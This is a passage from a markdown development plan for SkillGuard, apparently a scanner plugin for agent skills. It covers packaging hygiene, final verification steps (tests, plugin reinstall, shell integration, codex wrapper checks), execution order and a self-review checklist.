.venv/bin/python -m pytest tests/test_plugin_package_hygiene.py tests/test_install_sync.py -q
du -sh "$HOME/.claude/plugins/cache/skillguard/skillguard/0.3.1"
```

Expected: tests PASS, and plugin cache size is under 10 MB after reinstall.

- [ ] **Step 8: Commit**

If `.claude-pluginignore` works:

```bash
git add .claude-pluginignore README.md tests/test_plugin_package_hygiene.py
git commit -m "Exclude development artifacts from SkillGuard plugin installs"
```

If generated package is required:

```bash
git add .claude-plugin/marketplace.json scripts/build_plugin_package.py README.md tests/test_plugin_package_hygiene.py
git commit -m "Build clean SkillGuard plugin packages"
```

---

### Task 7: Final Verification On Real Local State

**Files:**
- No new source files.
- Read/verify: real `~/.claude/skillguard-cache`, `~/.local/bin/skillguard`, `.zshrc`, installed plugin cache.

- [ ] **Step 1: Run full test suite**

```bash
.venv/bin/python -m pytest
```

Expected: all tests pass.

- [ ] **Step 2: Check formatting whitespace**

```bash
git diff --check
```

Expected: no output.

- [ ] **Step 3: Refresh installed plugin**

```bash
claude plugin uninstall skillguard@skillguard --keep-data
claude plugin install skillguard@skillguard
```

Expected: plugin reinstalls without losing `~/.claude/skillguard-cache`.

- [ ] **Step 4: Install shell integration from active plugin CLI**

```bash
python3 "$HOME/.claude/plugins/cache/skillguard/skillguard/0.3.1/skillguard/cli.py" --install-shell-integration
```

Expected: prints paths for shim, shell file, and zshrc.

- [ ] **Step 5: Verify agent summary and review**

```bash
skillguard --agent-summary
printf 'q\n' | skillguard --review
```

Expected: summary includes target-kind scope and latest scan time; review shows plain-language `Why:` and `Safest:` lines.

- [ ] **Step 6: Verify wrapper behavior**

```bash
zsh -ic 'codex --version'
zsh -ic 'SKILLGUARD_AGENT_SUMMARY_FORCE=1 codex'
```

Expected:
- `codex --version` does not print the SkillGuard banner.
- forced plain `codex` launch prints the SkillGuard banner before invoking Codex.

- [ ] **Step 7: Verify persistence after a dry review**

```bash
skillguard --activity 10
ls -l "$HOME/.claude/skillguard-cache/_triage.json" "$HOME/.claude/skillguard-cache/skillguard.db"
```

Expected: activity command works; persistence files remain local under `~/.claude/skillguard-cache`.

- [ ] **Step 8: Commit final docs-only corrections if needed**

If verification reveals only README wording drift:

```bash
git add README.md
git commit -m "Document SkillGuard launch review setup"
```

---

## Execution Order

1. Task 1: summary scope and recency.
2. Task 2: plain-language review context.
3. Task 3: acknowledge flow.
4. Task 4: wrapper suppression for non-launch commands.
5. Task 5: unified shell setup across install paths.
6. Task 6: plugin package hygiene.
7. Task 7: real local verification.

This order keeps behavior visible and testable at every step. Tasks 1-5 improve the user journey; Task 6 reduces install/reinstall risk; Task 7 confirms the active machine matches the code.

## Self-Review

- Spec coverage: all five review findings are covered: PATH/plugin setup, wrapper scope, ack flow, non-engineer context, and packaging hygiene.
- Placeholder scan: no `TBD`, `TODO`, or "implement later" placeholders remain. The only branch is an explicit package-hygiene decision based on a measured plugin installer behavior.
- Type consistency: helper names are consistent across tasks: `load_cached_verdicts`, `render_agent_summary`, `finding_explanation`, `install_shell_integration`, and `write_shell_integration`.
- Scope check: web UI is intentionally excluded. This plan is CLI/install/package behavior only.
